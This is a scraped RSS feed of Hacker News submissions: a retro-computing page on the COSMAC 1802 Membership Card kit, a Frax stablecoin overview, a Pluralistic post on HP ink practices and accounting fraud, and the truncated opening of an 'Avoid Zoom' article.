<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Once upon a time, microcomputers were simple and easy to understand. So simple in fact that a kid like me, with no computer experience whatsoever, could actually understand them, build them, program them, and put them to work in his very own projects!</p><p>The COSMAC 1802 was created in the 1970's at the dawn of the microcomputer revolution, by <a href="https://en.wikipedia.org/wiki/Joseph_Weisbecker">Joseph Weisbecker</a> of RCA Corporation. It used their new CMOS fabrication process, which had very low power consumption, very high noise immunity, and was very simple to use. It was intended for military and aerospace; applications too tough for other microcomputers to survive.</p><p>But Joe was a hacker at heart. He wrote a series of articles starting in the August 1976 issue of Popular Electronics magazine called "Build the COSMAC ELF". It described a simple low-cost computer, using the 1802 microprocessor. At the time, microcomputer systems cost hundreds to thousands of dollars. (Hmm... they still do today!) But Weisbecker's ELF cost about $80! Yet, it was an honest-to-goodness real live computer, able to do anything its much bigger cousins could do -- albeit a bit slower and cruder.</p><p>It was the ideal computer trainer. Hobbyists built thousands of ELFs, learning about computer design, construction, and programming in the process. A dozen companies produced versions of the ELF, also selling for low prices. It was the "Legos" of computers; a simple building-block computer that could be assembled many ways to become almost anything, limited only by your imagination.</p><p>I learned about computing on my ELF. It put me on a career in engineering, as it did for thousands of others. 1802's got designed into all sorts of amazing things; video games, music synthesizers, auto engine controllers, military weapon systems, and even NASA missions such as the Galileo spacecraft. Eat stardust, PCs and Macs!</p><p>Today's computers are far more powerful than the 1802. But they have also become so complicated that virtually no one can build them or truly understand how they work. We depend on someone else to make them for us, and to provide us with the megabytes of pre-written software needed to do anything with them. You can't learn the basics if there is nothing "basic" to learn on! I decided to do something about it.</p><p>The <strong>Membership Card</strong> is a reproduction of the original Popular Electronics Elf computer, repackaged to fit in a pocket-sized Altoids(R) tin. It is entirely built with 1980's parts and technology. It uses only common low-cost through-hole parts (no custom ICs or surface-mount assembly). To use it, you don't need a modern PC, or megabytes of proprietary software. Now you can learn about computers right from the ground up, and <u>really</u> understand how they work!</p><div>

<img src="http://www.sunrise-ev.com/MembershipCard/dev4k-cpu-asm.jpg" width="464" height="279" title="Membership Card Assembled" alt="Membership Card Assembled">
<img src="http://www.sunrise-ev.com/photos/pixelshim.gif" width="12" height="279">

<h3>What's inside?</h3>

<p>There are two circuit boards, each the size of a credit card. One is the <strong>Membership Card</strong> itself. It has the 1802 microprocessor, up to 64k bytes of memory, 22 bits of I/O, clock, reset, and power supply circuits, plus a supercapacitor to maintain memory contents without power. It can be used by itself as a microcontroller for projects like the Parallax BASIC Stamps or Arduino microcontrollers. All power, input, and output signals are available on the 30-pin header along the bottom.</p>
<br clear="left">

<img src="http://www.sunrise-ev.com/MembershipCard/dev4j-fpanel-asm.jpg" width="464" height="286" title="Membership Card Front Panel Assembled" alt="Membership Card Front Panel Assembled">
<img src="http://www.sunrise-ev.com/photos/pixelshim.gif" width="12" height="286">

<p>The second board is the <strong>Front Panel</strong>. It provides the switches and LEDs for a "blinkin-lights" control panel, just like the classic computers of old. The Front Panel lets you read and write to memory and I/O ports manually, without any help from software or external devices. A USB-serial adapter (<a href="https://www.sparkfun.com/products/9718">Sparkfun #9718</a> or equivalent) plugs directly into the 6-pin header to provide power and serial I/O. The Front Panel also brings the power and I/O signals out to a robust DB25 to connect external devices. It can be plugged into a PC parallel or RS-232 serial port, so a PC can load, save, and run programs.</p>

<p>The Membership Card can be purchased as a bare board with manual, or as a complete kit with all parts including the RCA 1802 microcomputer, 32k bytes of RAM, and even an empty Altoids tin to put it all in. An optional Cover Card provides a finished cover with holes and labels for all the lights, switches, and connectors.</p>

<img src="http://www.sunrise-ev.com/MembershipCard/mshipcardkit.jpg" width="400" height="285" title="Membership Card Kit" alt="Membership Card Kit">
<img src="http://www.sunrise-ev.com/photos/pixelshim.gif" width="20" height="285">

<h3>Specifications</h3>
<ul>
<li>CPU: RCA CDP1802ACE microprocessor.
</li><li>Clock: Stable 4 MHz ceramic resonator.
</li><li>Memory:	32k bytes RAM; plus socket for another 32k RAM or EPROM. Supercapacitor holds RAM contents without power.
</li><li>I/O: one 8-bit output port, with LEDs.
<br>one 8-bit input port, with switches.
<br>one 1-bit output, with red LED.
<br>four 1-bit flag inputs, one with pushbutton switch, one with green LED
<br>one interrupt input.
</li><li>Connectors: 6-pin power/TTL serial connector (/ON, TX, RX, +V, GND).
<br>25-pin DB25 connector with all I/O (power, PC parallel, RS-232 serial).
</li><li>Size: 3-1/2" x 2-1/8" x 3/4" (89 x 54 x 19 mm).
</li><li>Power: 3v to 5v DC at 0.1 to 5ma (depends on clock speed, memory size, and number of LEDs on).
</li><li>Aroma: A hint of curiously strong peppermint.
</li></ul>

<a name="1802mc-special">
<p>The <b>Membership Card</b> is your ticket to the fascinating world of microcomputing. Return with us now to those thrilling days of yesteryear, when the heroic pioneers of the microcomputer revolution built their own computers from scratch, and learned to program them to do incredible things, all for a tiny amount of money!</p>

<hr>
</a><ul><a name="1802mcbare">
	</a><li><a name="1802mcbare"></a><a href="http://www.sunrise-ev.com/MembershipCard/memberk3.pdf">Membership Card Manual, rev.K3</a> in PDF format. This is the current version.
	</li><li><a href="http://www.sunrise-ev.com/MembershipCard/dev4k3-sch.png">Membership Card Schematic</a> in PNG format. How often do you get a real schematic for anything today? The schematic, parts list, and part sources are all in the manual as well.
	</li><li><a href="http://www.sunrise-ev.com/MembershipCard/1802cpuK3.pdf">"Special" 1802 CPU Card Quickstart Manual</a> in PDF format. This is an abbreviated manual for operating the 1802MC CPU card by itself.
	</li><li><a href="http://www.sunrise-ev.com/MembershipCard/memberjk3.pdf">Membership Card Manual, rev.JK3</a> in PDF format. Rev.JK3 was the previous version I was shipping last year. Email me if you need a manual for an older version.
	</li><li><a href="http://www.sunrise-ev.com/MembershipCard/1802cheatsheet.pdf">1802 Elf "Cheat Sheet"</a> in PDF format. A pocket card with the 1802 pinouts, instruction set, and operating summary for the Membership Card and other 1802-based computers.
	</li></ul>
Software
	<ul>
	<li>BASIC for the 1802
		<ul>
		<li><b>Tiny BASIC</b> is Tom Pittman's classic 1976 integer BASIC in just 2K bytes. Lee Hart, Herb Johnson, and Loren Christiansen have tweaked it for the 1802MC's memory map. The vintage TMSI IDIOT monitor is included for serial I/O.
			<ul>
			<li><a href="http://www.sunrise-ev.com/photos/1802/tb0_christiansen.zip">Tiny BASIC</a> is a ZIP file with everything needed. Burn the HEX file into a 4K-32K EPROM. Address the EPROM at 0000h, and RAM at 8000h. It's currently assembled to run with a rev.J or later Front Panel.
			</li><li><a href="http://www.ittybittycomputers.com/IttyBitty/TinyBasic/TBuserMan.txt">Tiny BASIC User Manual</a> by Tom Pittman (c) 1976. It documents the language, and provides many examples and internal details. His <a href="http://www.ittybittycomputers.com/IttyBitty/TinyBasic/">website</a> has more info, sample programs, and the interesting history of Tiny BASIC.
			</li><li><a href="http://www.ittybittycomputers.com/IttyBitty/TinyBasic/TBEK.txt">Tiny BASIC Experimenters Kit</a> This booklet provides many internal details, including an assembler for the intermediate language that Tiny BASIC was written in.
			</li><li><a href="http://www.sunrise-ev.com/photos/1802/TFBOTBAS.HTM">The First Book of Tiny BASIC Programs</a> by Tom Pittman (c) 1981. This is a gold mine of impressive Tiny BASIC programs; games, spreadsheets, disassemblers, etc.
			</li></ul>
		</li><li><b>BASIC3</b> is RCA's floating-point BASIC (equivalent to Microsoft BASIC), written by Ron Cenker in 1981. It's been resurrected by Chuck Yakym, Ed Keefe, Herb Johnson, and Lee Hart to run on the 1802MC or any ELF using the EF3 and Q pins for serial input/output.
			<ul>
			<li><a href="http://www.sunrise-ev.com/MembershipCard/BASIC3v11user.pdf">BASIC3 User Manual</a> for RCA BASIC3, in PDF format.
			</li><li>BASIC3 program ROMs: Download, and burn into a 16K 27C128 or 32K 27C256 EPROM. Address it to start at 0000h (U2-LO), and RAM to start at 8000h (U8-HI). BASIC3 starts immediately on power-up or reset, so no Front Panel or "jump" instruction is needed to start it. BASIC3 includes an auto-start feature; if a BASIC program is stored in ROM, it will run automatically on power-up or reset. <a href="http://www.sunrise-ev.com/MembershipCard/CALL3800.pdf">CALL3800.pdf</a> describes how to use this feature.
				<ul>
				<li><a href="http://www.sunrise-ev.com/MembershipCard/MCBASIC3.bin">MCBASIC3.bin</a> for any version Membership Card by itself (no Front Panel); or with rev.I and earlier MC Front Panels.
				</li><li><a href="http://www.sunrise-ev.com/MembershipCard/MCBASIC3J.bin">MCBASIC3J.bin</a> with rev.J and later Membership Card Front Panels.
				</li></ul>
			</li></ul>
		</li></ul>

</li><li>Monitor programs
	<ul>
	<li>Chuck Yakym's <b>MCSMP Super Monitor Program</b> plus <b>BASIC3</b>, in a single 32K EPROM. Download, and burn it into a 27C256 EPROM. Here are his <a href="http://www.sunrise-ev.com/MembershipCard/Readme.txt">Quickstart notes</a> and <a href="http://www.sunrise-ev.com/MembershipCard/MCSMP20.pdf">Instructions</a> for installing and running MCSMP in PDF format.
<ul>
<li>Versions for an EPROM at 8000h (jumper U2-HI), and RAM at 0000h (jumper U8-LO). In classic ELF fashion, you need a front panel to load an LBR 8000h instruction (C0 80 00) into the first 3 bytes of RAM, and execute it.
<ul>
<li><a href="http://www.sunrise-ev.com/MembershipCard/MCSMP20.bin">MCSMP20.bin</a> for any Membership Card with rev.I or earlier Front Panels.
</li><li><a href="http://www.sunrise-ev.com/MembershipCard/MCSMP20J.bin">MCSMP20J.bin</a> with rev.J and later MC Front Panels.
</li><li><a href="http://www.sunrise-ev.com/MembershipCard/mcsmp20r_vt52_1.1.bin">MCSMP20J plus VT52 Adventureland</a> <span color="red">NEW!</span> MCSMP20J with "Adventureland", written in 1980 by famous game author Scott Adams. It's brought to you by the tireless efforts of Richard Goedeken. Instructions and the source code (licensed under BSD are available <a href="https://github.com/richard42/1802-adventureland-plus">HERE</a> on Github. This version uses VT52 ESC commands, so set your Terminal program for VT52 emulation.
</li><li><a href="http://www.sunrise-ev.com/MembershipCard/mcsmp20r_ansi_1.1.bin">MCSMP20J plus ANSI Adventureland</a> Same, but this version uses ANSI ESC commands to add color. Set your Terminal program for ANSI mode.
</li></ul>
</li><li>Versions for an EPROM at 0000h (jumper U2-LO), and RAM at 8000h (jumper U8-HI). The monitor starts immediately on power-up or reset, so no Front Panel or LBR instruction is needed to start them.
<ul>
<li><a href="http://www.sunrise-ev.com/MembershipCard/MCSMP20A.bin">MCSMP20A.bin</a> for any version Membership Cards, either stand-alone, or with rev.I or earlier Front Panels.
</li><li><a href="http://www.sunrise-ev.com/MembershipCard/MCSMP20B.bin">MCSMP20B.bin</a> for any Membership Card with rev.J or later Front Panels.
</li></ul>
</li></ul>
</li><li><b>ELF-LINK</b> by Josh Bensadon controls the Membership Card from a PC parallel port. No software at all is needed in the Membership Card itself to examine and change memory, and load, save, and execute programs. Here is <a href="http://www.sunrise-ev.com/MembershipCard/ELF-LINK.BAS">ELF-LINK.BAS for QuickBASIC</a> in plain ASCII format, so you can see how to do it with your favorite programming language. And here is <a href="http://www.sunrise-ev.com/MembershipCard/ELF-LINK.exe">ELF-LINK.exe in executable format</a> if you don't have QuickBASIC. Who will be the first to translate it into C? :-)
	</li></ul>
	</li></ul>
More 1802 Information
	<ul>
	<li><a href="http://www.exemark.com/Microcontrollers/PopularElecwebc.pdf">Build the COSMAC "ELF" -- A Low-Cost Experimenter's Microcomputer</a>. The original Aug 1976 Popular Electronics article by Joseph Weisbecker that started it all.
	</li><li><a href="http://www.sunrise-ev.com/vcf-elf.htm">The VCF-ELF</a> is ‚Ä¶</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.sunrise-ev.com/1802.htm">http://www.sunrise-ev.com/1802.htm</a></em></p>]]>
            </description>
            <link>http://www.sunrise-ev.com/1802.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-26183553</guid>
            <pubDate>Thu, 18 Feb 2021 18:27:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Frax: World‚Äôs first fractional-algorithmically stabilized stablecoin]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 4 (<a href="https://news.ycombinator.com/item?id=26183483">thread link</a>) | @Bluestein
<br/>
February 18, 2021 | https://docs.frax.finance/overview | <a href="https://web.archive.org/web/*/https://docs.frax.finance/overview">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div data-editioncontainer="true"><div data-slate-editor="true" data-key="c661deaabfde4250bbd107c32d586f40" autocorrect="on" spellcheck="true" data-gramm="false"><p data-key="5c2f6050e8fe4fbea3690680c1d996b1"><span><span data-key="6ccd4104bbe54ed8bfc0983c8bef054d"><span data-offset-key="6ccd4104bbe54ed8bfc0983c8bef054d:0">Many stablecoin protocols have entirely embraced one spectrum of design (entirely collateralized) or the other extreme (entirely algorithmic with no backing). Collatralized stablecoins either have custodial risk or require on-chain overcollateralization. These designs provide a stablecoin with a fairly tight peg with higher confidence than purely algorithmic designs. Purely algorithmic designs such as Basis, Empty Set Dollar, and Seigniorage Shares provide a highly trustless and scalable model that captures the early Bitcoin vision of decentralized money but with useful stability. The issue with algorithmic designs is that they are difficult to bootstrap, slow to grow (as of Q4 2020 none have significant traction), and exhibit extreme periods of volatility which erodes confidence in their usefulness as actual stablecoins. They are mainly seen as a game/experiment than a serious alternative to collateralized stablecoins.

Frax attempts to be the first stablecoin protocol to implement design principles of both to create a highly scalable, trustless, extremely stable, and ideologically pure on-chain money. The Frax protocol is a two token system encompassing a stablecoin, Frax (FRAX), and a governance token, Frax Shares (FXS). The protocol also has pool contracts which hold collateral (at genesis USDT and USDC). Pools can be added or removed with governance.

Although there's no predetermined timeframes for how quickly the amount of collateralization changes, we believe that as FRAX adoption increases, users will be more comfortable with a higher percentage of FRAX supply being stabilized algorithmically rather than with collateral. The collateral ratio refresh function in the protocol can be called by any user once per hour. The function can change the collateral ratio in steps of .25% if the price of FRAX is above or below $1. When FRAX is above $1, the function lowers the collateral ratio by one step and when the price of FRAX is below $1, the function increases the collateral ratio by one step. Both refresh rate and step parameters can be adjusted through governance. In a future update of the protocol, they can even be adjusted dynamically using a PID controller design. The price of FRAX, FXS, and collateral are all calculated with a time-weighted average of the Uniswap pair price and the ETH:USD Chainlink oracle. The Chainlink oracle allows the protocol to get the true price of USD instead of an average of stablecoin pools on Uniswap. This allows FRAX to stay stable against the dollar itself which would provide greater resiliency instead of using a weighted average of existing stablecoins only.</span></span></span></p><p data-key="6a0fb64f8ddf49a292075e3f23b3f9a4"><span><span data-key="c7f1350efb8f4be4bbfcd688e0dcabba"><span data-offset-key="c7f1350efb8f4be4bbfcd688e0dcabba:0">FRAX stablecoins can be minted by placing the appropriate amount of its constituent parts into the system. At genesis, FRAX is 100% collateralized, meaning that minting FRAX only requires placing collateral into the minting contract. During the fractional phase, minting FRAX requires placing the appropriate ratio of collateral and burning the ratio of Frax Shares (FXS). While the protocol is designed to accept any type of cryptocurrency as collateral, this implementation of the Frax Protocol will mainly accept on-chain stablecoins as collateral to smoothen out volatility in the collateral so that FRAX can transition to more algorithmic ratios smoothly. As the velocity of the system increases, it becomes easier and safer to include volatile cryptocurrency such as ETH and wrapped BTC into future pools with governance. </span></span></span></p></div></div></div></div></div></div>]]>
            </description>
            <link>https://docs.frax.finance/overview</link>
            <guid isPermaLink="false">hacker-news-small-sites-26183483</guid>
            <pubDate>Thu, 18 Feb 2021 18:22:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Planet Money on HP's myriad ripoffs]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26183419">thread link</a>) | @samizdis
<br/>
February 18, 2021 | https://pluralistic.net/2021/02/18/ink-stained-wretches/#hache-pe | <a href="https://web.archive.org/web/*/https://pluralistic.net/2021/02/18/ink-stained-wretches/#hache-pe">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1894">
	<!-- .entry-header -->

	
	
	<div>
		<p><!--
Tags:
accountancy, monopoly, coalitions, corruption, monopoly, npr, printers, hp, scams, podcasts, eff, spoken word, mp3s, mmt

Summary:
Planet Money on HP's myriad ripoffs; Strength in numbers

URL:
https://pluralistic.net/2021/02/18/ink-stained-wretches/

Title:
Pluralistic: 18 Feb 2021 ink-stained-wretches

Bullet:
ü¶∏üèæ‚Äç‚ôÇÔ∏è

Separator:
_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_

Top Sources:
Today's top sources: Naked Capitalism (https://nakedcapitalism.com/).

--><br>
<a href="https://pluralistic.net/2021/02/18/ink-stained-wretches/"><img src="https://i0.wp.com/craphound.com/images/18Feb2021.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/18Feb2021.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>

<ul>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/02/18/ink-stained-wretches/#hache-pe">Planet Money on HP's myriad ripoffs</a>: Ink-stained wretches of the world, unite!
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/02/18/ink-stained-wretches/#countless">Strength in numbers</a>: The crisis in accounting.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/02/18/ink-stained-wretches/#retro">This day in history</a>: 2006, 2011, 2016
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/02/18/ink-stained-wretches/#bragsheet">Colophon</a>: Recent publications, upcoming/recent appearances, current writing projects, current reading
</li>
</ul>

<hr>
<p><a name="hache-pe"></a><br>
<img src="https://i2.wp.com/craphound.com/images/hp-drm-og_0.png?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/craphound.com/images/hp-drm-og_0.png?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Back in November, I published an article for EFF about HP's latest printer-ink ripoff: after offering its customers a free-ink-for-life plan, it unilaterally switched them all to a $1/month-for-life plan.</p>
<p><a href="https://www.eff.org/deeplinks/2020/11/ink-stained-wretches-battle-soul-digital-freedom-taking-place-inside-your-printer">https://www.eff.org/deeplinks/2020/11/ink-stained-wretches-battle-soul-digital-freedom-taking-place-inside-your-printer</a></p>
<p>I advocate on a lot of issues related to tech policy and 99% of the time, I'm trying to get people to care about complex technical issues before they become crises ‚Äì but people can't see the danger until it's too late.</p>
<p>Printer ink is the exception.</p>
<p>Everybody knows that printers are a ripoff: a monopolized, abusive industry that has devoted itself to the dirtiest, most deceptive, immoral tactics, and then handwaved them away with insulting, butter-wouldn't-melt, disingenuous excuses about doing it for our own good.</p>
<p>That article inspired a <em>fantastic</em> segment on the history of printer-ink shenanigans from NPR's Planet Money, "Why Printers Are The Worst."</p>
<p><a href="https://www.npr.org/2021/02/17/968704526/why-printers-are-the-worst">https://www.npr.org/2021/02/17/968704526/why-printers-are-the-worst</a></p>
<p>The Planet Money team did a characteristically excellent job of explaining just how depraved the ink scam is ‚Äì it's not just about screwing us all over, it's also about jettisoning every scrap of decency and consideration in service to unbridled greed.</p>
<p>This ‚Äì after all ‚Äì is the industry that pioneered sending out fake "security updates" that actually downgrade your device so that it no longer accepts third-party ink, thereby discouraging millions of people from running critical updates.</p>
<p>The printer companies ‚Äì led by HP ‚Äì are repeat offenders. They do something inexcusable, get caught, issue a nonpology, and then‚Ä¶do it again, only worse. The latest Planet Money segment does an outstanding job of laying out just how rotten the business of printing is.</p>
<p>You can subscribe to the Planet Money podcast RSS here:</p>
<p><a href="https://feeds.npr.org/510289/podcast.xml">https://feeds.npr.org/510289/podcast.xml</a></p>
<p>And here's a direct link to the MP3 for this episode:</p>
<p><a href="https://play.podtrac.com/npr-510289/edge1.pod.npr.org/anon.npr-mp3/npr/pmoney/2021/02/20210217_pmoney_pmpod1065.mp3https://www.npr.org/2021/02/17/968704526/why-printers-are-the-worst">https://play.podtrac.com/npr-510289/edge1.pod.npr.org/anon.npr-mp3/npr/pmoney/2021/02/20210217_pmoney_pmpod1065.mp3https://www.npr.org/2021/02/17/968704526/why-printers-are-the-worst</a></p>
<hr>
<p><a name="countless"></a><br>
<img src="https://i0.wp.com/craphound.com/images/counters.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/counters.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Accountancy is more likely to be mocked than celebrated (or condemned), but accountants, far more than poets, are the unacknowledged legislators of the world.</p>
<p>Though "bean counters" are employed by firms, they are notionally bound by a professional code of ethics every bit as serious as the Hippocratic Oath: "count things honestly." Without an accurate accounting of quantities, you can't make good decisions on quality.</p>
<p>Though accountancy concerns itself with counting things, it is inextricably bound up with the realm of ideas, and accounting conventions (how you account for things) are philosophical matters, not empirical ones.</p>
<p>It's no coincidence that Modern Monetary Theory owes more to accountancy than it does to economics. Economic accounts of the economy have an unfortunate tendency to proceed from first principles, creating models based on pure reason, without checking in on the actual world.</p>
<p>For example, neoclassical econ's "homo economicus," the rational value-maximizing actor who populated so many models; or economists' insistence on targeting inflation with interest rates; or treating national "debts" like they were household debts.</p>
<p>It's telling that the greatest economics revolution of my lifetime was "behavioral economics," which could also be called "checking to see whether real people act like we've assumed they acted."</p>
<p>If it seems weird that economists would spend generations operating on the incorrect assumption that people behave in a certain way without ever checking, consider that Aristotle assumed women had fewer teeth than men, ‚Äì and never bothered to count.</p>
<p><a href="https://www.scientificamerican.com/article/aristotles-error/">https://www.scientificamerican.com/article/aristotles-error/</a></p>
<p>Accountants check, and what they find is‚Ä¶gnarly. In "An Accounting Model of the UK Exchequer," Andrew Berkeley, Richard Tye &amp; Neil Wilson offer a mindbending account (heh) of where money comes from (hint: not taxes), and where it goes ("poof").</p>
<p><a href="https://gimms.org.uk/wp-content/uploads/2020/12/An-Accounting-Model-of-the-UK-Exchequer-Google-Docs.pdf">https://gimms.org.uk/wp-content/uploads/2020/12/An-Accounting-Model-of-the-UK-Exchequer-Google-Docs.pdf</a></p>
<p>The authors did a two-part MMT Podcast interview describing the paper's findings, and it is the most extraordinary 2.5h audio you're likely to find: not just the realities of money, but the deliberate obfuscation thereof.</p>
<p><a href="https://pileusmmt.libsyn.com/84-andrew-berkeley-richard-tye-neil-wilson-an-accounting-model-of-the-uk-exchequer-part-1">https://pileusmmt.libsyn.com/84-andrew-berkeley-richard-tye-neil-wilson-an-accounting-model-of-the-uk-exchequer-part-1</a></p>
<p><a href="https://pileusmmt.libsyn.com/86-andrew-berkeley-richard-tye-neil-wilson-an-accounting-model-of-the-uk-exchequer-part-2">https://pileusmmt.libsyn.com/86-andrew-berkeley-richard-tye-neil-wilson-an-accounting-model-of-the-uk-exchequer-part-2</a></p>
<p>One thing the Exchequer paper reveals is that accountants bat for both teams: team clarity and team obscurity. As many finance scandals and finance dramas have reminded us, accounting can be turned to obscuring and dazzling rather than revelation.</p>
<p>After all, somewhere in HM Exchequer is a team of accountants who know <em>exactly</em> how money works ‚Äì and know that it's nothing like the account produced by economists or politicians. They know it because they are in charge of it. They do money, all day long.</p>
<p>When accountants go rogue, things get bad. And thanks to neoclassical economics ‚Äì and its emphasis on the "efficiency" of monopolies ‚Äì we are living through a golden age of ghastly accounting fraud.</p>
<p>Just four companies ‚Äì EY, KPMG, PWC and Deloitte ‚Äì audit the books of 97% of the 350 largest UK companies; but they make far more selling these companies consulting services, and have made a habit of lying about those books in order to boost their consulting income.</p>
<p>Accountancy is meant to be a profession that understands that conflicts of interest are a moral hazard. But just as doctors convince themselves they won't get addicted to their own painkillers, accountants talk themselves into believing that conflicts won't corrupt them.</p>
<p>That's how the Big Four accounting companies came to sign off Carillion's fraudulent books. The company hid ¬£7b worth of debts, took on management of vital government services up and down the country, then collapsed, leaving the nation stranded.</p>
<p><a href="https://en.wikipedia.org/wiki/Carillion#Financial_difficulties">https://en.wikipedia.org/wiki/Carillion#Financial_difficulties</a></p>
<p>For the Big Four, Carillion's collapse was a feature, not a bug. After all, the only accounting firms large enough to oversee its bankruptcy were‚Ä¶the Big Four, who billed millions for cleaning up the mess left behind by their own fraud.</p>
<p>Accounting fraud is a fascinating potential fracture line in economic reform. After all, fraudulent accountants may help <em>some</em> plutes get rich ‚Äì like, say Bernie Madoff, or Donald Trump ‚Äì but they often do so at the expense of <em>other</em> plutes.</p>
<p>Like Exxon, which lied to its investors for 11 years about the value of its shale-gas holdings, which it purchased at the peak of the fracking bubble and whose revenues and liabilities it has buried in its financial statements ever since.</p>
<p><a href="https://www.desmogblog.com/2021/02/02/whistleblower-sec-complaint-alleges-exxon-fraud-overvalue-fracking-assets">https://www.desmogblog.com/2021/02/02/whistleblower-sec-complaint-alleges-exxon-fraud-overvalue-fracking-assets</a></p>
<p>The company is finally writing down $19.3b worth of those assets, but the true figure is more like $50b. And yes, Exxon's big investors include a lot of passive funds that invest pension savings, meaning this hurts Main Street as well as Wall Street.</p>
<p>But as ever, those pension-savers are the Lucky Duckies here, because ‚Äì joke's on us ‚Äì Americans have basically no pension savings, thanks to the wage stagnation and asset inflation that left almost all working Americans facing penury in old age.</p>
<p>Hey, at least they're not getting ripped off by Exxon! The real victims of this decade-long, multibillion-dollar fraud are the same people who got snookered into buying into shitty Trump casinos and luxury buildings: rich people.</p>
<p>By definition, rich people deal in quantities that exceed their ability to personally count so they are especially vulnerable to scam accounting. It's only when the frauds tank a company we all suffer, as jobs and businesses disappear, screwing workers  and cities.</p>
<p>The absence of a neutral ref and scorekeeper is a really big deal in online business and policy circles. The ad-tech duopoly isn't merely content to price-gouge advertisers ‚Äì they also lie about what those sky-high prices are paying for:</p>
<p><a href="https://pluralistic.net/2020/10/05/florida-man/#wannamakers-ghost">https://pluralistic.net/2020/10/05/florida-man/#wannamakers-ghost</a></p>
<p>But each member of the duopoly has a different scam. Google's frauds are complex, behind-the-scenes market manipulations, an abstruse, mathematical grift that leverages complexity and monopoly to fleece its customers.</p>
<p><a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=3500919">https://papers.ssrn.com/sol3/papers.cfm?abstract_id=3500919</a></p>
<p>Facebook is much more straightforward. It just lies. Back in 2016, FB lied about how many people were watching videos, and encouraged hundreds of media company to beggar themselves to chase fraudulent video dollars:</p>
<p><a href="https://www.wired.com/story/facebook-lawsuit-pivot-to-video-mistake/">https://www.wired.com/story/facebook-lawsuit-pivot-to-video-mistake/</a></p>
<p>Accounting fraud is in Facebook's DNA. After all, this is a company whose primary sales-pitch is, "We will count everything you do and then charge people to help them sell you stuff."</p>
<p>This proposition is intrinsically hard to evaluate. How can a customer know if their FB ad generated a sale, or whether it was an ad elsewhere, or random chance, or even that elusive beast, customer loyalty?</p>
<p>The main source for the belief in Facebook's efficacy is‚Ä¶Facebook. It's not a neutral party, and the accountants who sign off on its books have repeatedly shown themselves to be untrustworthy.</p>
<p>Here's the latest scandal: since 2018, FB's been defending a class-action suit brought by its customers who claim that FB lied about "potential reach" ‚Äì that is, how many users would see their ads.</p>
<p><a href="https://www.ft.com/content/c144b3e0-a502-440b-8565-53a4ce5470a5">https://www.ft.com/content/c144b3e0-a502-440b-8565-53a4ce‚Ä¶</a></p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pluralistic.net/2021/02/18/ink-stained-wretches/#hache-pe">https://pluralistic.net/2021/02/18/ink-stained-wretches/#hache-pe</a></em></p>]]>
            </description>
            <link>https://pluralistic.net/2021/02/18/ink-stained-wretches/#hache-pe</link>
            <guid isPermaLink="false">hacker-news-small-sites-26183419</guid>
            <pubDate>Thu, 18 Feb 2021 18:18:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Avoid Zoom (2020)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26183409">thread link</a>) | @mooreds
<br/>
February 18, 2021 | https://www.alchemists.io/articles/avoid_zoom/ | <a href="https://web.archive.org/web/*/https://www.alchemists.io/articles/avoid_zoom/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  


  <main>
    <section>
      

      <section>
        

        <article>
          <div>
<p><a href="https://zoom.us/"><img src="https://www.alchemists.io/images/articles/avoid_zoom/icon.png" alt="Logo" width="300" height="300"></a>
</p>
<p>Avoid Zoom</p>
</div>
<div>
<h2 id="_overview">Overview</h2>
<div>
<p>Even before the Coronavirus pandemic, which has made video conferencing tools all the more
important, Zoom was a rising star in the field. Zoom provided solutions for common collaboration
problems with a lot of useful features, including surprisingly good video and audio despite multiple
attendees having various levels of bandwidth in the conversation. Previously, we were limited to
Google Meet, Slack Video, Webex, GoToMeeting, etc., all of which were various aspects of awful, and
having Zoom on the scene showed promise of a better experience.</p>
<p>By early 2019, though, reports emerged of disturbing conduct by Zoom as a company, casting doubt on
the integrity of their software offering as a whole. By mid-2019, these disturbances were exposed as
shocking displays of neglect and disregard for customer security‚Äâ‚Äî‚Äâto a point where Apple had to
patch macOS due to shady code installed by the Zoom installer. Around this time, I choose to avoid
Zoom and removed it from the <a href="https://www.alchemists.io/projects/mac_os-config">macOS Configuration</a> project. I‚Äôve not
gone back, despite the ubiquity of platform in the time of Coronavirus.</p>
<p>Perhaps the long tail of a company‚Äôs trajectory and practices is often forgotten in an age when we
